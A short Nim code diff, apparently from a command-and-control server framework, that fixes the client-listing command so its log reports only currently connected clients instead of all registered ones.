@@ -4,13 +4,15 @@ import ../../types
 import ../../logging
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
+  var connectedClients = 0
   for client in server.clients:
     if client.connected:
       stdout.styledWrite fgGreen, "[+] ", $client, fgWhite
+      inc connectedClients
     else:
       stdout.styledWrite fgRed, "[-] ", $client, fgWhite
     stdout.styledWriteLine (if client in server.cli.handlingClient: "(interacting)" else: "")
-  infoLog $len(server.clients) & " clients currently connected"
+  infoLog $connectedClients & " clients currently connected"
 
 let cmd*: Command = Command(
   execProc: execProc,
